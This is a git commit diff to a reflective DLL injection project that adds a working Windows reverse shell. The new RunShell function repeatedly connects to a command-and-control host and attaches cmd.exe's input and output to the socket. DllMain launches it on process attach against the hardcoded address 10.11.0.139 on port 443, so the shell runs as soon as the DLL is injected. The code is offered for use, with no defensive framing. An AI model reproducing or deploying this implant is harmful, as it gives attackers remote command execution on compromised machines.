6bc23ef0b8ebb473343d80d1b236ea8ee3c1d9e5
rohare6 <rohare6@bloomberg.net>
2019-04-17 16:14:58 -0400

    added shell code which compiles

--- dll/src/ReflectiveDll.c
+++ dll/src/ReflectiveDll.c
@@ -1,6 +1,14 @@
 //===============================================================================================//
 // This is a stub for the actuall functionality of the DLL.
 //===============================================================================================//
+#define _WINSOCKAPI_
+#include <WinSock2.h>
+#include <WS2tcpip.h>
+#include <Windows.h>
+#include <ws2def.h>
+#pragma comment(lib, "ws2_32.lib")
+#define DEFAULT_BUFLEN 1024
+
 #include "ReflectiveLoader.h"
 
 // Note: REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR and REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN are
@@ -10,6 +18,67 @@
 // You can use this value as a pseudo hinstDLL value (defined and set via ReflectiveLoader.c)
 extern HINSTANCE hAppInstance;
 //===============================================================================================//
+
+
+// sc
+void RunShell(char* C2Server, int C2Port) {
+	while (TRUE) {
+		Sleep(5000);    // 1000 = One Second
+
+		SOCKET mySocket;
+		struct sockaddr_in addr;
+		WSADATA version;
+		WSAStartup(MAKEWORD(2, 2), &version);
+		mySocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
+		addr.sin_family = AF_INET;
+
+		addr.sin_addr.s_addr = inet_addr(C2Server);  //IP received from main function
+		addr.sin_port = htons(C2Port);     //Port received from main function
+
+		//Connecting to Proxy/ProxyIP/C2Host
+		if (WSAConnect(mySocket, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
+			closesocket(mySocket);
+			WSACleanup();
+			continue;
+		}
+		else {
+			char RecvData[DEFAULT_BUFLEN];
+			memset(RecvData, 0, sizeof(RecvData));
+			int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
+			if (RecvCode <= 0) {
+				closesocket(mySocket);
+				WSACleanup();
+				continue;
+			}
+			else {
+				char Process[] = "cmd.exe";
+				STARTUPINFO sinfo;
+				PROCESS_INFORMATION pinfo;
+				memset(&sinfo, 0, sizeof(sinfo));
+				sinfo.cb = sizeof(sinfo);
+				sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
+				sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE)mySocket;
+				CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
+				WaitForSingleObject(pinfo.hProcess, INFINITE);
+				CloseHandle(pinfo.hProcess);
+				CloseHandle(pinfo.hThread);
+
+				memset(RecvData, 0, sizeof(RecvData));
+				int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
+				if (RecvCode <= 0) {
+					closesocket(mySocket);
+					WSACleanup();
+					continue;
+				}
+				if (strcmp(RecvData, "exit\n") == 0) {
+					exit(0);
+				}
+			}
+		}
+	}
+}
+
+
 BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved )
 {
     BOOL bReturnValue = TRUE;
@@ -21,6 +90,11 @@ BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved )
 			break;
 		case DLL_PROCESS_ATTACH:
 			hAppInstance = hinstDLL;
+
+			// insert the shell code here
+			RunShell("10.11.0.139", 443);
+
+			// leaving this in as a test so I can get some feedback if the dll works and there is a shell code error
 			MessageBoxA( NULL, "Hello from DllMain!", "Reflective Dll Injection", MB_OK );
 			break;
 		case DLL_PROCESS_DETACH:
